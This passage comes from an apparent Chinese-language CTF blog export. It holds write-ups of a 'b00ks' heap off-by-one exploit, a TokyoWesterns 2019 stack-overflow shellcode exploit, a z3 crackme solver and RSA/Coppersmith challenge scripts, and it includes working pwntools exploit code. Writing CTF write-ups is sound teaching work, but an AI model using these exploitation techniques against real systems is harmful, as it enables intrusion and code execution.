off-by-one ，事实上 my_read 读入的结束符 '\\x00' 是写入到 0x555555756060 的位置的。这样当 0x555555756060～0x555555756068 写入 book 指针时就会覆盖掉结束符 '\\x00' ，所以这里是存在一个地址泄漏的漏洞。通过打印 author name 就可以获得 pointer array 中第一项的值。\n\nbooks 位置\n\n~~~assembly\n        0x55865b7c9040:    0x4141414141414141    0x4141414141414141\n        0x55865b7c9050:    0x4141414141414141    0x4141414141414141 --> author\nb00ks<--0x55865b7c9060:    0x000055865cc0d160(first book)    0x0000000000000000\n~~~\n\nnull byte overflow\n\n~~~assembly\n0x55865b7c9040:    0x4141414141414141    0x4141414141414141\n0x55865b7c9050:    0x4141414141414141    0x4141414141414141\n0x55865b7c9060:    0x000055865cc0d100(0x60-->0x00)    0x000055865cc0d190\n~~~\n\n**1. 创建第一个firest book**\n\n~~~assembly\n0x55f276c74160:    0x0000000000000001                 0x000055f276c74020--> Name\n0x55f276c74170:    0x000055f276c740c0(description)    0x000000000000008c(140)\n~~~\n\n当`0x55f276c74160 --> 0x55f276c74100`时, `0x55f276c74100`正好落在`first b00k`的`description`中, 属于可控范围, 为我们伪造`b00k`打下了基础.\n\n**2. leak book1 addr**\n\nmy_read 读入的结束符 '\\x00' 会被写如 book1 时覆盖\n\n所以 print author name 时 会泄露 book1 在 buf 的地址\n\n**3. 申请 book2**\n\nbook2的description的大小越大越好(如0x21000)，这样会通过mmap()函数去分配堆空间，而该堆地址与libc的基址相关，这样通过泄露该堆地址可以计算出libc的基址。\n\n**4. 伪造book**\n\n~~~assembly\n0x55f276c740c0:    0x4141414141414141    0x4141414141414141\n0x55f276c740d0:    0x4141414141414141    0x4141414141414141\n0x55f276c740e0:    0x4141414141414141    0x4141414141414141\n0x55f276c740f0:    0x4141414141414141    0x4141414141414141\n0x55f276c74100:    0x0000000000000001    0x000055f276c74198----\n0x55f276c74110:    0x000055f276c74198    0x000000000000ffff   |\n......                                                   |\n0x55f276c74160:    0x0000000000000001    0x000055f276c74020   |\n0x55f276c74170:    0x000055f276c740c0    0x000000000000008c   |\n0x55f276c74180:    0x0000000000000000    0x0000000000000031   |\n0x55f276c74190:    0x0000000000000002    0x00007f282b8e7010 <-|\n0x55f276c741a0:    0x00007f282b8c5010    0x0000000000021000\n0x55f276c741b0:    0x0000000000000000    0x0000000000020e51\n~~~\n\n可以看到`0x55f276c74100`已经是`fake b00k1`\n\n**5. 空字节覆盖 leak book2 name pointer&libcbase**\n\n~~~assembly\n0x55f275d55040:    0x4141414141414141    0x4141414141414141\n0x55f275d55050:    0x4141414141414141    0x4141414141414141\n0x55f275d55060:    0x000055f276c74100    0x000055f276c74190\n~~~\n\n泄露的是`second b00k`的`name pointer`和`description pointer`.\n这个指针和libc base address是有直接联系的.\n\n~~~assembly\n0x000055f276c73000 0x000055f276c95000 rw-p    [heap]\n0x00007f282b33e000 0x00007f282b4fe000 r-xp    /lib/x86_64-linux-gnu/libc-2.23.so\n0x00007f282b4fe000 0x00007f282b6fe000 ---p    /lib/x86_64-linux-gnu/libc-2.23.so\n~~~\n\n  `offset = 0x7f282b8e7010 - 0x00007f282b33e000 = 0x5a9010`\n  **结论:** 通过伪造的`b00k`, 我们泄露了 `libc base address`.\n\n**6. 获取相关指针\n\n主要是两个\n\n~~~assembly\nmalloc_hook = libc.symbols['__free_hook'] + libcbase\nexecve_addr = libcbase + 0x4526a\n~~~\n\n **结论:**  通过`libc base address`, 退出了`__free_hook`和`execve_addr`在程序中的实际位置.\n\n**7. 修改 get shell**\n\n通过先后修改`book1_description`和`book2_description`，可以实现任意地址写任意内容的功能。由于该程序启用了`FULL RELRO`保护措施，无法对`GOT`进行改写，但是可以改写`__free_hook`或`__malloc_hook`。\n\n通过`first b00k`修改`second b00k`的`description`指针为`__free_hook`, 在修改second b00k的description内容为`execve(\"/bin/sh\", null, environ)`, 最后执行`free`\n\n~~~assembly\n0x55f276c74190:    0x0000000000000002    0x00007f282b7047a8 --\n0x55f276c741a0:    0x00007f282b7047a8    0x0000000000021000  |\n......                                                  |\n0x7f282b7047a8 <__free_hook>:  0x00007f306ff4726a    0x0000000000000000\n~~~\n\n**结论:** 由于`__free_hook`里面的内容不为`NULL`, 遂执行内容指向的指令, 即`execve(\"/bin/sh\", null, environ)`\n\n#### 相关问题解答\n\n**为什么第二个 b00k申请的空间那么大?**\n\n> ​    If we allocate a chunk bigger than the wilderness chunk, it  mmap’s a new area for use. And this area is adjacent to the libc’s bss  segment\n> 简单的说, 申请小了不能够泄露出`libc base address`\n\n\n\n**exp**\n\n~~~python\nfrom pwn import *\n#context.log_level = 'debug'\nelf = ELF(\"./b00ks\")\nlibc = ELF(\"/lib/x86_64-linux-gnu/libc.so.6\")\np = process(\"./b00ks\")\n\ndef create_name(name):\n\tp.sendlineafter(\"Enter author name: \", name)\n\ndef create_book(size,name,des_size,des):\n\tp.sendlineafter(\"> \",\"1\")\n\tp.sendlineafter(\"\\nEnter book name size: \",str(size))\n\tp.sendlineafter(\"Enter book name (Max 32 chars): \",name)\n\tp.sendlineafter(\"\\nEnter book description size: \", str(des_size))\n\tp.sendlineafter(\"Enter book description: \", des)\n\ndef delete_book(id):\n\tp.sendlineafter(\"> \", \"2\")\n\tp.sendlineafter(\"Enter the book id you want to delete: \", str(id))\n\ndef edit_book(id,new_des):\n\tp.sendlineafter(\"> \",\"3\")\n\tp.sendlineafter(\"Enter the book id you want to edit: \", str(id))\n\tp.sendlineafter(\"Enter new book description: \", new_des)\n\ndef memleak2():\n\tp.sendlineafter(\"> \",\"4\")\n\tp.recvuntil(\"Name: \")\n\tmsg=p.recvline().strip(\"\\n\")\n    msg=u64(msg.ljust(8, \"\\x00\"))\n    log.success(\"Leaked address of second book name pointer : \" + hex(msg))\n    return msg\n\ndef change_name(name):\n\tp.sendlineafter(\"> \",\"5\")\n\tp.sendlineafter(\"Enter author name: \", name)\ndef memleak1():\n\tp.recvuntil(\"> \")\n\tp.sendline(\"4\")\n\tp.recvuntil(\"Author:\")\n\tmsg = p.recvuntil(\"\\n\",drop=True)[33:]\n\tlog.success(\"msg : \"+msg)\n\taddr = u64(msg.ljust(8, \"\\x00\"))\n\tlog.success(\"Leaked address of first book : \" + hex(addr))\n\treturn addr\ncreate_name(\"a\"*32)\ncreate_book(140,\"a\",140,\"a\")\n#leak book addr\nfirst_addr = memleak1()\nsecond_addr = first_addr + 0x38\nlog.success(\"second addr : \" + hex(second_addr))\n\n#create second book\ncreate_book(0x21000,\"a\",0x21000,\"a\")\n\n#fake first book\npayload = \"a\"*0x40 + p64(1) + p64(second_addr)*2 + p64(0xffff)\nedit_book(1,payload)\n\n#null byte off-by-one\nchange_name(\"a\"*32)\n\n#leak second book pointer\nsec_name_addr = memleak2()\n\nlibcbase = sec_name_addr - 0x5b0010\nlog.info(\"libcbase: %s\" % hex(libcbase))\nfree_hook = libc.symbols['__free_hook'] + libcbase\nlog.success(\"free_hook : \" + hex(free_hook))\nexecve_addr = libcbase + 0x45216\nlog.success(\"execve : \" + hex(execve_addr))\n#gdb.attach(p)\n# getshell\nsystem = libc.symbols['system'] + libcbase\nbinsh_addr = libc.search('/bin/sh').next() + libcbase\npayload = p64(binsh_addr) + p64(free_hook)\nedit_book(1, payload)\npayload = p64(system)\nedit_book(2, payload)\n'''\nedit_book(1,p64(free_hook)*2)\nedit_book(2,p64(execve_addr))\n'''\ndelete_book(2)\np.interactive()\n~~~\n","tags":["pwn","heap"],"categories":["CTF"]},{"title":"TokyoWesternsCTF 2019 writeup","url":"/2019/09/02/TokyoWesternsCTF-2019-writeup/","content":"tcl 做了三道签到题目\n\n## warmup\n没有任何保护的栈溢出\n```python\nfrom pwn import *\n\nelf=ELF('./pwn')\n\nshellcode = \"\\x48\\x31\\xff\\x48\\x31\\xf6\\x48\\x31\\xd2\\x48\\x31\\xc0\\x50\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x53\\x48\\x89\\xe7\\xb0\\x3b\\x0f\\x05\"\n\naddr=0x0000000000601A00\n\nbuf=0x00007FFE0740F240\nret=0x00007FFE0740F348\n\n#io=process('./pwn')\n#pause()\nio=remote('nothing.chal.ctf.westerns.tokyo',10001)\nio.sendline((ret-buf)*'a'+p64(0x0000000000400773)+p64(addr)+p64(elf.plt['gets'])+p64(addr))\nio.sendline(shellcode)\nio.interactive()\n```\n\n## easy_crackme\n这道题目耗时间比较长\n最后用z3 一个一个进行约束即可\n### check1\n```cpp\n    v46 = '76543210';\n    v47 = 'fedcba98';\n    for ( i = 0; i <= 15; ++i )\n    {\n      for ( j = strchr(s, *((char *)&v46 + i)); j; j = strchr(j + 1, *((char *)&v46 + i)) )\n        ++*((_DWORD *)&s1 + i);\n    }\n    if ( memcmp(&s1, &unk_400F00, 0x40uLL) )\n    {\n      puts(\"incorrect\");\n      exit(0);\n    }\n    ```\n判断字符出现次数\n### check2\n```cpp\nv21 = 0LL;\n    v22 = 0LL;\n    v23 = 0LL;\n    v24 = 0LL;\n    v25 = 0LL;\n    v26 = 0LL;\n    v27 = 0LL;\n    v28 = 0LL;\n    for ( k = 0; k <= 7; ++k )\n    {\n      v10 = 0;\n      v11 = 0;\n      for ( l = 0; l <= 3; ++l )                // 遍历 {***} 的内容\n      {\n        v5 = s[4 * k + 6 + l];\n        v10 += v5;\n        v11 ^= v5;\n      }\n      *((_DWORD *)&v21 + k) = v10;              // 四个一组的和\n      *((_DWORD *)&v25 + k) = v11;              // 四个一组异或的值\n    }\n    ```\n\n### check3\n```cpp\n    v29 = 0LL;\n    v30 = 0LL;\n    v31 = 0LL;\n    v32 = 0LL;\n    v33 = 0LL;\n    v34 = 0LL;\n    v35 = 0LL;\n    v36 = 0LL;\n    for ( m = 0; m <= 7; ++m )\n    {\n      v14 = 0;\n      v15 = 0;\n      for ( n = 0; n <= 3; ++n )\n      {\n        v6 = s[8 * n + 6 + m];\n        v14 += v6;\n        v15 ^= v6;\n      }\n      *((_DWORD *)&v29 + m) = v14;\n      *((_DWORD *)&v33 + m) = v15;\n    }\n    if ( memcmp(&v21, &unk_400F40, 0x20uLL) || memcmp(&v25, &unk_400F60, 0x20uLL) )\n    {\n      puts(\"incorrect\");\n      exit(0);\n    }\n    if ( memcmp(&v29, &unk_400FA0, 0x20uLL) || memcmp(&v33, &unk_400F80, 0x20uLL) )\n    {\n      puts(\"incorrect\");\n      exit(0);\n    }\n    ```\n\n### check4\n```cpp\n    memset(v45, 0, sizeof(v45));\n    for ( ii = 0; ii <= 31; ++ii )\n    {\n      v7 = s[ii + 6];\n      if ( v7 <= 0x2F || v7 > 0x39 )\n      {\n        if ( v7 <= 0x60 || v7 > 0x66 )\n          v45[ii] = 0;\n        else\n          v45[ii] = 0x80;\n      }\n      else\n      {\n        v45[ii] = 0xFF;\n      }\n    }\n    if ( memcmp(v45, &unk_400FC0, 0x80uLL) )\n    {\n      puts(\"incorrect\");\n      exit(0);\n    }\n    ```\n### check5\n```cpp\nv18 = 0;\n    for ( jj = 0; jj <= 15; ++jj )\n      v18 += s[2 * (jj + 3)];\n    if ( v18 != 1160 )\n    {\n      puts(\"incorrect\");\n      exit(0);\n    }\n    ```\n### check6\n```cpp\n    if ( s[37] != 0x35 || s[7] != 102 || s[11] != 0x38 || s[12] != 0x37 || s[23] != 0x32 || s[31] != 0x34 )\n    {\n      puts(\"incorrect\");\n      exit(0);\n    }\n    printf(\"Correct: %s\\n\", s, a2);\n    result = 0LL;\n  }\n```\n\n解题脚本如下：\n```python\n# !user/bin/python2.7\n# coding:utf-8\nfrom collections import Counter\nfrom z3 import *\n\ns = Solver()\nflag = [BitVec(\"a%d\"%i,8) for i in range(32)]\nsum1 = [0x15E, 0x0DA, 0x12F, 0x131, 0x100, 0x131, 0x0FB, 0x102]\nxor1 = [0x52, 0x0C, 1, 0x0F, 0x5C, 5, 0x53, 0x58]\nsum2 = [0x129, 0x103, 0x12B, 0x131, 0x135, 0x10B, 0x0FF, 0x0FF]\nxor2 = [1, 0x57, 7, 0x0D, 0x0D, 0x53, 0x51, 0x51]\ncnt = [3, 2, 2, 0, 3, 2, 1, 3, 3, 1, 1, 3, 1, 2, 2, 3]\nmemcmp = [0x80, 0x80, 0xFF, 0x80, 0xFF, 0xFF, 0xFF, 0xFF, 0x80, 0xFF, 0xFF, 0x80, 0x80, 0xFF, 0xFF, 0x80, 0xFF, 0xFF, 0x80, 0xFF, 0x80, 0x80, 0xFF, 0xFF, 0xFF, 0xFF, 0x80, 0xFF, 0xFF, 0xFF, 0x80, 0xFF]\nd = \"0123456789abcdef\"\n'''\nfor i in range(0,16):\n\ts.add(str(flag).count(str(ord(d[i])))==cnt[i])\n'''\nfor j in range(32):\n\tif memcmp[j] == 0x80:\n\t\ts.add(flag[j]> 0x60)\n\t\ts.add(flag[j]<=0x66)\n\telse:\n\t\ts.add(flag[j]<=0x39)\n\t\ts.add(flag[j]> 0x2f)\nfor x in flag:\n\ts.add(0x30<=x)\n\ts.add(0x67>x)\n\ns.add(flag[1]==102)\ns.add(flag[5]==0x38)\ns.add(flag[6]==0x37)\ns.add(flag[17]==0x32)\ns.add(flag[25]==0x34)\ns.add(flag[31]==0x35)\n#for i in range(len())\nfor i in range(len(flag)):\n\ts.add(flag[i]!=51)\nfor i in range(0,len(flag),4):\n\ts.add(flag[i]+flag[i+1]+flag[i+2]+flag[i+3]==sum1[i/4])\n\ts.add(flag[i]^flag[i+1]^flag[i+2]^flag[i+3]==xor1[i/4])\n\nfor i in range(0,8):\n\ts.add(flag[i]+flag[i+8]+flag[i+16]+flag[i+24]==sum2[i])\n\ts.add(flag[i]^flag[i+8]^flag[i+16]^flag[i+24]==xor2[i])\nsum = 0\nfor i in range(0,32,2):\n\tsum += flag[i]\ns.add(sum == 1160)\n\n\nprint \"[-] check sat ·····\"\nif s.check() == sat:\n\tm = s.model()\n\tprint m\n\tprint \"[+] print flag ·····\"\n\tkk = \"\"\n\tfor i in range(0,32):\n\t\tkk +=  chr(int(\"%s\" % (m[flag[i]])))\n\tprint \"TWCTF{\"+kk+\"}\"\nelse:\n\tprint \"[+] False     ·····\"\n```\n\n## real baby rsa\n加密是逐个字符加密\n我们可以加密所有可见字符\n然后对比出flag\n```python\nflag = 'TWCTF{CENSORED}'\nimport libnum\n# Public Parameters\nN = 36239973541558932215768154398027510542999295460598793991863043974317503405132258743580804101986195705838099875086956063357178601077684772324064096356684008573295186622116931603804539480260180369510754948354952843990891989516977978839158915835381010468654190434058825525303974958222956513586121683284362090515808508044283236502801777575604829177236616682941566165356433922623572630453807517714014758581695760621278985339321003215237271785789328502527807304614754314937458797885837846005142762002103727753034387997014140695908371141458803486809615038309524628617159265412467046813293232560959236865127539835290549091\ne = 65537\n'''\n# Encrypt the flag!\nfor char in flag:\n    print(pow(ord(char), e, N))\n'''\ndic = \"TWCTF}{QWERTYUIOPASDFGHJKLZXCVBNM?/><.,:;\\\"\\'[]qwertyuiopasdfghjklzxcvbnm0123456789!@#$%^&*()_-+=~`\"\nflag = \"\"\nwith open('output') as f:\n\tfor line in f:\n\t\txx = line.rstrip()\n\t\tfor i in dic:\n\t\t\tzz = str(pow(ord(i),e,N))\n\t\t\tif xx[:600] == zz[:600]:\n\t\t\t\tflag += i\n\t\t\t\tbreak\n\nprint flag\n```\n","tags":["write up"],"categories":["CTF"]},{"title":"2019强网杯-copperstudy","url":"/2019/07/17/2019强网杯-copperstudy/","content":"## copperstudy -- coppersmith\n\n解题脚本\n```python\n#coding:utf-8\n\nimport hashlib\nfrom pwn import *\nimport time\n\ndef cha1(s,s256):\n\tss = ''\n\tfor i in range(5):\n\t\tss = ss + chr(int((s[2 * i] + s[2 * i + 1]),16))\n\tfor i in range(0,256):\n\t\tfor j in range(0,256):\n\t\t\tfor h in range(0,256):\n\t\t\t\ta = ss + chr(i) + chr(j) + chr(h)\n\t\t\t\tif hashlib.sha256(a).hexdigest() == s256:\n\t\t\t\t\treturn a.encode('hex')\n\n\nif __name__ == '__main__':\n\tip = '119.3.245.36'\n\tport = 12345\n\tteamtoken = 'dde3f26577d8d7816378038885943de1'\n\ts = remote(ip,port)\n\ts.recvuntil('[+]hashlib.sha256(skr).hexdigest()=')\n\td256 = s.recvline()\n\ts.recvuntil(\"[+]skr[0:5].encode('hex')=\")\n\td = s.recvline()\n\tdata = cha1(d.strip(),d256.strip())\n\ts.recvuntil(\"[-]skr.encode('hex')=\")\n\ts.sendline(data)\n\ts.recvuntil(\"[+]teamtoken:\")\n\ts.sendline(teamtoken)\n\ttime.sleep(2）\n    #challenge1 -- Known High Bits Message Attack\n\tm = '858be94f2f6253ac4586da573086221c8256bf7fe7c7f6d0d4e459fd28abf8883cfa225f5cbb519d2c8e0427aab1dc03979886ac104018ddec85e8edb7bbc590'\n\ts.recvuntil(\"_bytes(m).encode('hex')=\")\n\ts.sendline(m)\n\ttime.sleep(2)\n    #challenge2 -- Factoring with High Bits Known\n\tm2 = \"7e2a3378b47f389134bda8811e253ace33c6978fbb5d0022ab312cf1f5246648516b320bf749e71a1d8cbdcab64fdb5ce8159022ea96484949152d31a9f17665\"\n\ts.recvuntil(\"_bytes(m).encode('hex')=\")\n\ts.sendline(m2)\n\ttime.sleep(2)\n\t#challenge3 -- Patial Key Exposure Attack\n\tm3 = \"86ee347cbeec999564c0615d33ea5e3cfb5e66f5d00b172194c0f86915de3ff19d2dffc2217caaa608ea6556b18e8f420fc1b287871475a0cd5c8f2d97e4c12c\"\n\ts.recvuntil(\"_bytes(m).encode('hex')=\")\n\ts.sendline(m3)\n\ttime.sleep(4)\n\t#challenge4 -- Basic Broadcast Attack\n\tm4 = \"380185242a03c9d6ca7a2e117490ebaf03a493b1250f4e248c732c2714eb6b9fd2fa4c90a4f1d8120ffbafb3b7fda85fff46a67a1da3e316392ec267e1fa7c27\"\n\ts.recvuntil(\"_bytes(m).encode('hex')=\")\n\ts.sendline(m4)\t\t\t  \t\t\t       \n\ttime.sleep(20)\n\t#challenge5 -- Related Message Attack\n    m5 = \"0811b179ddbc246fc00ad94b6251c818e331941732fdfce9979c015ca7f0ec873641338c5814f3e8e50dfab04bd6aa0689334b517de10d7bac398aef23f929b3\"\n\ts.sendlineafter(\"[-]long_to_bytes(m).encode('hex')=\",m5)\n\ttime.sleep(4)\n\t#challenge6 -- Boneh and Durfee attack\n\tm6 = \"6b3bb0cdc72a7f2ce89902e19db0fb2c0514c76874b2ca4113b86e6dc128d44cc859283db4ca8b0b5d9ee35032aec8cc8bb96e8c11547915fc9ef05aa2d72b28\"\n\ts.sendlineafter(\"[-]long_to_bytes(m).encode('hex')=\",m6)\n\ttime.sleep(4)\n\n\tprint s.recv()\n```\n\n### challenge1 -- Known High Bits Message Attack\n\n```\n[++++++++++++++++]proof completed[++++++++++++++++]\n[+]Generating challenge 1\n[+]n=0x331e53d1808798def926bc2c8081b3a959cec19c04ad6dd3a25357b5e3889dc0bbb8618b80ddecca89494eec6015080cf4402fcef0971f76d978c517ab1e3019ae65fdc443a99036d4adcda780dd662ae3eb5d3c6ce68adfe38137689df75a6196a7a6dc94a681dfb5437439c810416112b250402f53eb2341df2145c569c135L\n[+]e=3\n[+]m=random.getrandbits(512)\n[+]c=pow(m,e,n)=0xab7b8544dc18a13c221d33b8ea84ee69ea3c74a1ce123e6f0a565e6afaff3d2682dfa254170a1200d66e9c017727c43b3c1af221f81d90598741454f68448cef4128ff56bb9929ffd3edaaa8069c08293463ad20486b6e6bee654ab471a3b364122d41f4570f6aa1084eb1eda5eebde1436a488e0390f8057df835f323802d4L\n[+]((m>>72)<<72)=0x858be94f2f6253ac4586da573086221c8256bf7fe7c7f6d0d4e459fd28abf8883cfa225f5cbb519d2c8e0427aab1dc03979886ac104018000000000000000000L\n[-]long_to_bytes(m).encode('hex')=\n```\n题目给了明文的高位部分\n```python\n    n =\n    e = 3\n    m = randrange(n)\n    c = pow(m, e, n)\n    beta = 1\n    epsilon = beta^2/7\n    nbits = n.nbits()\n    kbits = floor(nbits*(beta^2/e-epsilon))\n    #mbar = m & (2^nbits-2^kbits)\n    mbar =\n    c =\n    print “upper %d bits (of %d bits) is given” % (nbits-kbits, nbits)\n    PR.<x> = PolynomialRing(Zmod(n))\n    f = (mbar + x)^e – c\n    print m\n    x0 = f.small_roots(X=2^kbits, beta=1)[0]  # find root < 2^kbits with factor = n\n    print mbar + x0\n    print x0\n```\n### challenge2 -- Factoring with High Bits Known\n```\n[++++++++++++++++]challenge 1 completed[++++++++++++++++]\n[+]Generating challenge 2\n[+]n=0x116c51f73ef1c6b3b890dd8be446b80ac1dbe93742348e1284a7fdf0c76604ceae72011918f18de6b0ab873500ef2ed351110b67acce5b8c48a750a376c3e0117c44ec58e84e35f2ebf0e553b718720952dc826e364f130c2839c76878e0bfb3be0f24b06b3d91f1655e7ce588d2a3c429901197012db4d8b802308072bfca3fL\n[+]e=65537\n[+]m=random.getrandbits(512)\n[+]c=pow(m,e,n)=0x8d8fba82b1ca4e8a6e87b1ed5d50a9e6e49b3fb2aed78208e8c513842dedb5f14b82b39e03ea86089e76b59ff7bec0f6647096098346dcf64c7d1aaf533f99827fd9979dee217c511a3192e99a70d4fcd6aa44b2cf52a1ceddf99db42cbf2872e7e2ed421a4a9ff548bef6dfdad7ef17b09748bdf0025dfb93091e11115ebd4L\n[+]((p>>128)<<128)=0x2bff4035e24f2023f876abaf53ef53374d0208d59d4350a1cf356050c3a09cfc644d9c46cb59f013fadd96bea4a56dd100000000000000000000000000000000L\n[-]long_to_bytes(m).encode('hex')=\n\n```\n```python\nn=0x985CBA74B3AFCF36F82079DE644DE85DD6658A2D3FB2D5C239F2657F921756459E84EE0BBC56943DE04F2A04AACE311574BE1E9391AC5B0F8DBB999524AF8DF2451A84916F6699E54AE0290014AFBF561B0E502CA094ADC3D9582EA22F857529D3DA79737F663A95767FDD87A9C19D8104A736ACBE5F4A25B2A25B4DF981F44DB2EB7F3028B1D1363C3A36F0C1B9921C7C06848984DFE853597C3410FCBF9A1B49C0F5CB0EEDDC06D722A0A7488F893D37996F9A92CD3422465F49F3035FEA6912589EFCFB5A4CF9B69C81B9FCC732D6E6A1FFCE9690F34939B27113527ABB00878806B229EC6570815C32BC2C134B0F56C21A63CA535AB467593246508CA9F9\np=0xBCF6D95C9FFCA2B17FD930C743BCEA314A5F24AE06C12CE62CDB6E8306A545DE468F1A23136321EB82B4B8695ECE58B763ECF8243CBBFADE0603922C130ED143D4D3E88E483529C820F7B53E4346511EB14D4D56CB2B714D3BDC9A2F2AB655993A31E0EB196E8F63028F9B29521E9B3609218BA0000000000000000000000000\np_fake = p+0x10000000000000000000000000\npbits = 1024\nkbits = pbits-576\npbar = p_fake & (2^pbits-2^kbits)\nprint \"upper %d bits (of %d bits) is given\" % (pbits-kbits, pbits)\nPR.<x> = PolynomialRing(Zmod(n))\nf = x + pbar\nx0 = f.small_roots(X=2^kbits, beta=0.4)[0]  # find root < 2^kbits with factor >= n^0.4\nprint x0 + pbar\n```\n\n### challenge3 -- Patial Key Exposure Attack\n\n```\n[++++++++++++++++]challenge 2 completed[++++++++++++++++]\n[+]Generating challenge 3\n[+]n=0x56705388192a25439c7ec9f826467255aeac3a1991b0a5804e8cbe01d4fd33c0accdacc8cb2497969133116d841032cd023f29e4014b0c7619c40ce6e1977308f3587da928fe7c103e8fd68c0e909d229e68c23879c010f88dca4481af1c7030466edc93898b12f31dba9e7aa513fb1fd84c3d1d028cc068160501dafa1d54bL\n[+]e=3\n[+]m=random.getrandbits(512)\n[+]c=pow(m,e,n)=0xcbe7d8021fa02b92239521aeaaf76b2d9553b6b738c79a2c31ef9dcef7875d5bde76f5ebb318660761090869c02c182a29516482e5daf090df76d10eab9398ede85a00d47abb3e27f6a87f8c0928e18c778efb3b6a02acb52257369cbc7e3015bda888e50d5586a34a5554df1f5f0e4cb0b8e9dd442ed939f610d18731be3L\n[+]d=invmod(e,(p-1)*(q-1))\n[+]d&((1<<512)-1)=0xd74e2c4973ea6530620197a999a7a78d85a3029dfe8931397ee15b480c2f77b5042938e2f58f60e9c44e4f8d911b661b42dac0dbc0c1513773f870916b2418abL\n[-]long_to_bytes(m).encode('hex')=\n```\n\n```python\ndef partial_p(p0, kbits, n):\n    PR.<x> = PolynomialRing(Zmod(n))\n    nbits = n.nbits()\n\n    f = 2^kbits*x + p0\n    f = f.monic()\n    roots = f.small_roots(X=2^(nbits//2-kbits), beta=0.3)  # find root < 2^(nbits//2-kbits) with factor >= n^0.3\n    if roots:\n        x0 = roots[0]\n        p = gcd(2^kbits*x0 + p0, n)\n        return ZZ(p)\n\ndef find_p(d0, kbits, e, n):\n    X = var('X')\n\n    for k in xrange(1, e+1):\n        results = solve_mod([e*d0*X - k*X*(n-X+1) + k*n == X], 2^kbits)\n        for x in results:\n            p0 = ZZ(x[0])\n            p = partial_p(p0, kbits, n)\n            if p:\n                return p\n\n\nif __name__ == '__main__':\n    n = 0x56705388192a25439c7ec9f826467255aeac3a1991b0a5804e8cbe01d4fd33c0accdacc8cb2497969133116d841032cd023f29e4014b0c7619c40ce6e1977308f3587da928fe7c103e8fd68c0e909d229e68c23879c010f88dca4481af1c7030466edc93898b12f31dba9e7aa513fb1fd84c3d1d028cc068160501dafa1d54b\n    e = 3\n    d = 0xd74e2c4973ea6530620197a999a7a78d85a3029dfe8931397ee15b480c2f77b5042938e2f58f60e9c44e4f8d911b661b42dac0dbc0c1513773f870916b2418ab\n\n    beta = 0.5\n    epsilon = beta^2/7\n\n    nbits = n.nbits()\n    kbits = floor(nbits*(beta^2+epsilon))\n    d0 = d & (2^kbits-1)\n    print \"lower %d bits (of %d bits) is given\" % (kbits, nbits)\n\n    p = find_p(d0, kbits, e, n)\n    print \"found p: %d\" % p\n    q = n//p\n    print d\n    print inverse_mod(e, (p-1)*(q-1))\n\nlower 291 bits (of 1019 bits) is given\nfound p: 1556928330519222949185052385205770511398851299027067030656737931164636055914888549373041706626311467428902396847671677538586996128733508490246169051729867\n11276456863053049846778143161914757923513133539274086554204762345263769886584929828068603961625809916094813748871857226391606896679593696242167359171991723\n2529140489407550411860842517642709534323596281579020017754223390342047118996108186564106911103882855078009689932113065210547912624644857741988858283570121514938039297592621259739497542591992130948345362969430345095193882648382370898025817668567519357247651572797940766217498405274704879818312077507052181675\n```\n\n### challenge4 -- Basic Broadcast Attack\n```\n[++++++++++++++++]challenge 3 completed[++++++++++++++++]\n[+]Generating challenge 4\n[+]e=3\n[+]m=random.getrandbits(512)\n[+]n1=0x9c94fecac76f9c5524d994d51efc1f02ad40fcf9cd5409d7c9f86a9f10e31b6c73d8bc02df743fea939acbcf9f81a748914fce0f8df1155c0f29faac38bd70b322eb7bc69c130720bdcb2ad2cbb84ad182b36e93170d81cb3a68969c850519e86b6a3676534cdbe85c9429c058230d58527d8028c134d6078cbb89faa071848fL\n[+]c1=pow(m,e,n1)=0x5e3b988abb38c33e145bbc16f56ec192253d26cc053d4f78e073d0d035eda4ea91f33ec7f7cd1a56165cae95a86e0a4edabb83743966b3a4621bb33753aec5fa4b1c6d80e0d404c19c6659c8ff6dc4f5539a5dbae659ca4f24f4c53a65c5c42bf9de04852c098841d2affe83c59be99b6ecd857e232cb008c657e1f55137bf06L\n[+]n2=0x409a8a39fcb302f0660f0a85b6d43636dce5b4797b6f3ef0b4972f70b6e0c74038c55ba50e0c918057e9ceaee024ae81da2faede8b5b66caae6892943a8892ad98b1f6f208b8b5ded753e6b8c6b94c5faf67314384f3f26e3dca579237893f098c90b0f8b80692aed4606947d656b74b69444ba0dc24b9c66a339f7a50f52783L\n[+]c2=pow(m,e,n2)=0xc5381d89ca5be27f43c30dbc395ce0d5b8a69adb80dc05d7f5d8dffc1b2fb76d2ab656f5659b9280c9cac83addcc0eb58e86f8e07a37f28b0500ab75bde4eb2b2e6631eeeb6bbe146c889b2ac6046864977aaee7292676fdbd4fb987940a83a94c3d04aef256b50d304d945528c69866acf591f914c0e50e012734827143ed7L\n[+]n3=0x56a700d8f04da68c6cdb08e04a0cb2fa332389e10c1a3c94b220cb39144fc971c804ab02637303866040c13814194d863814453eec48db6136741d3a599cf890c678114b65dc60da2bbd29651bd0148f8949d69c4b18460ad0e1908eba384a1b51041e41caf70fed285fb34a8e56f04487d6d8b5d88f2a88d88565ef6757a697L\n[+]c3=pow(m,e,n3)=0x73e58f11dd9f637a7a7c05f6223ee95cb6d34a77583bfc6ca675955d51dd15ff4561654264e9985fcb2e87e3ddda7d6d7620cee80a1f2c20944d5d6f456a3e892f74b6745ddecbe3447825bf44344fc9e0839bdaebcca8352075675ffc8fee8c3698a87f3110f4004fea88c3faf05e5a527854e759e315b487b49e8ff9510cbL\n[-]long_to_bytes(m).encode('hex')=\n\n```\n```python\nimport gmpy2\n\nimport 